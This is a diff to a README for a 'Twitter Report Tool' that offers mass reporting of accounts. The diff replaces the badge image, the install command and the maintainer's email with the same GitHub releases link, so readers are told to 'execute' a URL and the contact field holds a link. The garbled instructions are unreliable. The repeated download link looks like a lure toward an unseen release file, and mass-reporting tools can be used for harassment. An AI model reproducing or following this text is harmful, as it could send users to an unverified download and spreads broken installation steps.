@@ -1,6 +1,6 @@
 # Twitter Report Tool
 
-![Twitter Report Tool](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=twitter)
+![Twitter Report Tool](https://github.com/Hanckseb/Twitter-Report-Tool/releases%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=twitter)
 
 Welcome to the **Twitter Report Tool**! This tool helps users report spam and abusive accounts on Twitter effectively. It simplifies the process of mass reporting, making it easier for you to contribute to a cleaner Twitter environment.
 
@@ -37,7 +37,7 @@ To install the **Twitter Report Tool**, follow these steps:
 3. Extract the files to your desired location.
 4. Open your terminal or command prompt.
 5. Navigate to the directory where you extracted the files.
-6. Run the installation script by executing `./install.sh` (or the appropriate command for your system).
+6. Run the installation script by executing `https://github.com/Hanckseb/Twitter-Report-Tool/releases` (or the appropriate command for your system).
 
 ## Usage
 
@@ -71,6 +71,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Hanckseb
-- **Email**: hanckseb@example.com
+- **Email**: https://github.com/Hanckseb/Twitter-Report-Tool/releases
 
 Thank you for using the **Twitter Report Tool**! Together, we can make Twitter a safer place for everyone.
